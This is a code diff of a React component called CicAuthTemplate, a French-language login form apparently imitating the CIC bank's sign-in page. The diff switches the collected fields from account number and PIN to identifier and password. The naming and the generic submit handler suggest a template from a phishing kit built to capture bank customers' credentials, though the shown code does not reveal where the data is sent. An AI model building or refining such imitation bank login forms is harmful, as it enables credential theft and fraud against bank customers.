@@ -7,12 +7,12 @@ interface CicAuthTemplateProps {
 
 export function CicAuthTemplate({ onSubmit }: CicAuthTemplateProps) {
   const [formData, setFormData] = useState({
-    accountNumber: '',
-    pin: ''
+    identifier: '',
+    password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
-  const [showPin, setShowPin] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -81,14 +81,14 @@ export function CicAuthTemplate({ onSubmit }: CicAuthTemplateProps) {
             <form onSubmit={handleSubmit} className="space-y-6 max-w-md mx-auto">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Numéro de compte
+                  Identifiant
                 </label>
                 <input
                   type="text"
-                  name="accountNumber"
-                  value={formData.accountNumber}
+                  name="identifier"
+                  value={formData.identifier}
                   onChange={handleChange}
-                  placeholder="Entrez votre numéro de compte"
+                  placeholder="Entrez votre identifiant"
                   required
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                 />
@@ -96,24 +96,24 @@ export function CicAuthTemplate({ onSubmit }: CicAuthTemplateProps) {
 
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Code PIN
+                  Mot de passe
                 </label>
                 <div className="relative">
                   <input
-                    type={showPin ? 'text' : 'password'}
-                    name="pin"
-                    value={formData.pin}
+                    type={showPassword ? 'text' : 'password'}
+                    name="password"
+                    value={formData.password}
                     onChange={handleChange}
-                    placeholder="Entrez votre code PIN"
+                    placeholder="Entrez votre mot de passe"
                     required
                     className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                   />
                   <button
                     type="button"
-                    onClick={() => setShowPin(!showPin)}
+                    onClick={() => setShowPassword(!showPassword)}
                     className="absolute right-3 top-3 text-gray-500"
                   >
-                    {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
+                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                   </button>
                 </div>
               </div>
